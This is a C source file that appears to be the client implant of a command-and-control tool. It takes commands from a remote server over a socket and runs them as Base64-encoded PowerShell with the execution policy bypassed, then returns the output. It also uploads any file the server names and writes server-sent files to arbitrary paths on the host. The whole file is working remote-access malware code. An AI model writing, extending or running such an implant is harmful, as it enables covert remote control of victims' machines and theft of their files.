#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "c2.h"
#include "client/utils.h"
#include "common.h"

static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Encode binary data to Base64 text
static void b64_encode(const unsigned char *in, int len, char *out) {
    int i = 0, j = 0;
    unsigned char c3[3];
    while (len--) {
        c3[i++] = *(in++);
        if (i == 3) {
            out[j++] = b64[c3[0] >> 2];
            out[j++] = b64[((c3[0] & 3) << 4) | (c3[1] >> 4)];
            out[j++] = b64[((c3[1] & 15) << 2) | (c3[2] >> 6)];
            out[j++] = b64[c3[2] & 63];
            i = 0;
        }
    }
    if (i) {
        out[j++] = b64[c3[0] >> 2];
        out[j++] = b64[((c3[0] & 3) << 4) | (i == 2 ? (c3[1] >> 4) : 0)];
        out[j++] = (i == 2 ? b64[(c3[1] & 15) << 2] : '=');
        out[j++] = '=';
    }
    out[j] = '\0';
}

int psh_exec(sock_t sock, const char *cmd) {
    if (!cmd || !*cmd) return -1;

    int cmdlen = (int)strlen(cmd);

    // powershell -enc expects Base64 of UTF-16LE encoded command
    unsigned short unicode[4096] = {0};
    if (cmdlen > (int)(sizeof(unicode)/sizeof(unicode[0]) - 1)) return -1;
    for (int i = 0; i < cmdlen; i++) unicode[i] = (unsigned short)(unsigned char)cmd[i];

    char encoded[8192];
    b64_encode((unsigned char*)unicode, cmdlen * 2, encoded);

    char fullcmd[8192];
    // Compose final command string for _popen
    snprintf(fullcmd, sizeof(fullcmd), "powershell.exe -ep bypass -enc %s", encoded);

    // Launch PowerShell and capture stdout pipe
    FILE *fp = _popen(fullcmd, "r");

    char buf[C2_BUF_SIZE];
    size_t total_len = 0;
    size_t alloc_size = C2_BUF_SIZE;
    char *output = malloc(alloc_size);
    if (!output) {
        pclose(fp);
        return 1;
    }

    while (fgets(buf, sizeof(buf), fp)) {
        size_t len = strlen(buf);

        // Expand buffer if needed
        if (total_len + len >= alloc_size) {
            alloc_size = (total_len + len) * 2;
            char *tmp = realloc(output, alloc_size);
            if (!tmp) {
                free(output);
                pclose(fp);
                return 1;
            }
            output = tmp;
        }

        memcpy(output + total_len, buf, len);
        total_len += len;
    }

    // Null-terminate
    output[total_len] = '\0';
    safe_send_payload(sock, output, total_len + 1, 0);
    free(output);
    return 0;
}

void psh_receive(sock_t sock) {
    while (1) {
        char* cmd = (char*)safe_recv_payload(sock, NULL, 0);

        if (strcmp(cmd, "quit") == 0) break;

        printf("C2> %s\n", cmd);

        psh_exec(sock, cmd);
        free(cmd);
    }
    return;
}

void upload_file_to_server(sock_t sock) {
    // I will properly set status code in the future trust
    char status = '1';
    char *remote_path = (char*)safe_recv_payload(sock, NULL, 0);
    if (!remote_path) {
        return;
    }

    size_t file_size = 0;
    char *file_buffer = read_file(remote_path, &file_size);
    if (!file_buffer) {
        free(remote_path);
        return;
    }

    if (file_size > INT_MAX) {
        free(file_buffer);
        free(remote_path);
        return;
    }

    
    if (safe_send(sock, &status, 1, 0) <= 0) {
        free(file_buffer);
        free(remote_path);
        return;
    }
    safe_send_payload(sock, file_buffer, (int)file_size, 0);
    free(file_buffer);
    free(remote_path);
}

void download_file_from_server(sock_t sock) {
    char *remote_path = (char*)safe_recv_payload(sock, NULL, 0);
    if (!remote_path) {
        return;
    }

    int incoming_size = 0;
    BYTE *file_buffer = (BYTE*)safe_recv_payload(sock, &incoming_size, 0);
    if (!file_buffer) {
        free(remote_path);
        return;
    }

    if (remote_path[0] == '\0') {
        free(remote_path);
        free(file_buffer);
        return;
    }

    FILE *fp = fopen(remote_path, "wb");
    if (!fp) {
        free(remote_path);
        free(file_buffer);
        return;
    }

    size_t expected = (size_t)incoming_size;
    size_t written = expected ? fwrite(file_buffer, 1, expected, fp) : 0;
    fclose(fp);

    if (written == expected) {
        char status = '1';
        safe_send(sock, &status, 1, 0);
    }

    free(remote_path);
    free(file_buffer);
}